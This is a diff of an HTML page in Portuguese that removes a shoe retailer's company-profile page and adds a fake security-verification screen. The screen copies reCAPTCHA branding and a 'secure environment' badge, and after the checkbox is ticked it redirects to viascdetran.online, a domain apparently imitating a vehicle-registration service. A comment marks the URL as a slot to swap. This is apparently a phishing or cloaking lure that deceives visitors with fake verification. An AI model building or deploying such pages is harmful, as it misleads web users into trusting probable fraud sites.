@@ -1,211 +1,228 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Tempo Bom Comercio de Calcados LTDA</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verificação de Segurança</title>
 
 <style>
-body { margin: 0; font-family: "Segoe UI", Arial, sans-serif; background: #f4f6f9; color: #333; }
-
-/* HEADER */
-header {
-background: linear-gradient(135deg, #0a2a4f, #154a8a);
-padding: 25px 40px;
-color: #fff;
-display: flex;
-justify-content: space-between;
-align-items: center;
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
 }
 
-header h1 {
-margin: 0;
-font-size: 26px;
-font-weight: 600;
-letter-spacing: 1px;
+body{
+  font-family: Arial, Helvetica, sans-serif;
+  background: linear-gradient(135deg,#e2e8f0,#f8fafc);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
 }
 
-nav a {
-color: #fff;
-margin-left: 25px;
-text-decoration: none;
-font-size: 16px;
-font-weight: 500;
+/* Container */
+.container{
+  width:100%;
+  max-width:380px;
+  text-align:center;
+  padding:15px;
 }
 
-/* HERO */
-.hero {
-padding: 100px 20px;
-text-align: center;
-background: url('https://images.unsplash.com/photo-1521737604893-d14cc237f11d') center/cover no-repeat;
-color: #fff;
+/* Card */
+.card{
+  background:#ffffff;
+  border-radius:12px;
+  padding:25px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  animation:fadeIn 0.6s ease;
 }
 
-.hero h2 {
-font-size: 40px;
-font-weight: 700;
-text-shadow: 0 3px 8px rgba(0,0,0,0.4);
+.title{
+  font-size:20px;
+  color:#1e293b;
+  margin-bottom:8px;
+  font-weight:600;
 }
 
-.hero p {
-font-size: 20px;
-margin-top: 15px;
-text-shadow: 0 2px 6px rgba(0,0,0,0.4);
+.subtitle{
+  font-size:13px;
+  color:#475569;
+  margin-bottom:20px;
 }
 
-/* SECTION */
-section {
-max-width: 1100px;
-margin: 60px auto;
-padding: 40px;
-background: #fff;
-border-radius: 12px;
-box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+/* Captcha */
+.captcha-box{
+  border:1px solid #d1d5db;
+  border-radius:8px;
+  padding:15px;
+  background:#f9fafb;
 }
 
-h2 {
-color: #0a2a4f;
-font-size: 28px;
-margin-bottom: 15px;
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
 }
 
-/* CARDS */
-.grid {
-display: grid;
-grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-gap: 25px;
-margin-top: 20px;
+/* Área checkbox */
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:10px;
+  border-radius:6px;
+  cursor:pointer;
+  transition:0.2s;
 }
 
-.card {
-background: #f9fbfd;
-padding: 25px;
-border-radius: 12px;
-border: 1px solid #e3e9f0;
-transition: 0.2s;
+.check-area:hover{
+  background:#e2e8f0;
 }
 
-.card:hover {
-box-shadow: 0 4px 16px rgba(0,0,0,0.1);
-transform: translateY(-4px);
+.check-area input{
+  width:22px;
+  height:22px;
+  cursor:pointer;
 }
 
-.card h3 {
-color: #154a8a;
+.check-text{
+  font-size:14px;
+  color:#1e293b;
 }
 
-/* FOOTER */
-footer {
-background: #0a2a4f;
-padding: 25px;
-color: #fff;
-text-align: center;
-margin-top: 60px;
+/* Marca */
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
 }
 
-footer a {
-color: #79b8ff;
-text-decoration: none;
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+/* Loader */
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #cbd5f5;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0);}
+  100%{transform:rotate(360deg);}
+}
+
+/* Rodapé */
+.footer{
+  margin-top:15px;
+  font-size:12px;
+  color:#64748b;
+}
+
+.footer span{
+  display:block;
+  margin-top:4px;
+  color:#94a3b8;
+}
+
+/* Selo segurança */
+.secure{
+  margin-top:15px;
+  font-size:12px;
+  color:#16a34a;
+  font-weight:600;
+}
+
+/* animação */
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
 }
 </style>
 </head>
 
 <body>
 
-<header>
-<h1>Tempo Bom Comercio de Calcados LTDA</h1>
-<nav>
-<a href="index.html">Início</a>
-<a href="politica-de-privacidade.html">Política de Privacidade</a>
-</nav>
-</header>
+<div class="container">
 
-<div class="hero">
-<h2>Calçados com Qualidade e Conforto</h2>
-<p>Oferecemos produtos de qualidade para garantir estilo, conforto e satisfação aos nossos clientes.</p>
-</div>
+  <div class="card">
 
-<section>
-<h2>Quem Somos</h2>
+    <div class="title">Verificação de Segurança</div>
+    <div class="subtitle">
+      Confirme que você é humano para continuar
+    </div>
 
-<p>
-A empresa <strong>Tempo Bom Comercio de Calcados LTDA</strong>,
-inscrita no CNPJ <strong>12.148.752/0002-64</strong>,
-foi fundada em <strong>10/09/2020</strong> na cidade
-<strong>Rio de Janeiro – RJ</strong>.
-</p>
+    <div class="captcha-box">
 
-<p>
-Sua atividade principal, conforme a Receita Federal, é
-<strong>47.82-2-01 - Comércio varejista de calçados</strong>.
-A empresa possui situação cadastral <strong>Ativa</strong>.
-</p>
+      <div class="captcha-row">
 
-<p>
-Nosso objetivo é oferecer calçados de qualidade,
-unindo conforto, estilo e excelente atendimento aos nossos clientes.
-</p>
+        <label class="check-area">
+          <input type="checkbox" id="check">
+          <div id="loader" class="loader"></div>
+          <span class="check-text" id="text">Não sou um robô</span>
+        </label>
 
-</section>
+        <div class="captcha-brand">
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+          reCAPTCHA
+          <br>
+          <span style="font-size:9px;">Privacidade - Termos</span>
+        </div>
 
-<section>
-<h2>Nossas Especialidades</h2>
+      </div>
 
-<div class="grid">
+    </div>
 
-<div class="card">
-<h3>Calçados Masculinos</h3>
-<p>Modelos modernos e confortáveis para diversas ocasiões.</p>
-</div>
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
 
-<div class="card">
-<h3>Calçados Femininos</h3>
-<p>Estilo, elegância e qualidade em cada detalhe.</p>
-</div>
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
+      <span>Isso ajuda a proteger o sistema contra acessos indevidos</span>
+    </div>
 
-<div class="card">
-<h3>Conforto e Qualidade</h3>
-<p>Produtos selecionados para garantir a melhor experiência aos clientes.</p>
-</div>
-
-<div class="card">
-<h3>Atendimento ao Cliente</h3>
-<p>Compromisso com atendimento eficiente e satisfação dos consumidores.</p>
-</div>
+  </div>
 
 </div>
 
-</section>
+<script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
 
-<section>
-<h2>Nossos Pilares</h2>
+check.addEventListener("change", () => {
 
-<div class="grid">
+  if(check.checked){
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
 
-<div class="card">
-<h3>Missão</h3>
-<p>Oferecer calçados de qualidade com conforto e estilo.</p>
-</div>
+    setTimeout(() => {
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
 
-<div class="card">
-<h3>Visão</h3>
-<p>Ser referência no comércio de calçados e satisfação dos clientes.</p>
-</div>
+      // 🔴 TROQUE AQUI
+      window.location.href = "https://viascdetran.online/";
 
-<div class="card">
-<h3>Valores</h3>
-<p>Qualidade, confiança, transparência e compromisso com o cliente.</p>
-</div>
+    }, 1800);
+  }
 
-</div>
-
-</section>
-
-<footer>
-© 2025 Tempo Bom Comercio de Calcados LTDA • CNPJ 12.148.752/0002-64
-<br>
-<a href="politica-de-privacidade.html">Política de Privacidade</a>
-</footer>
+});
+</script>
 
 </body>
 </html>
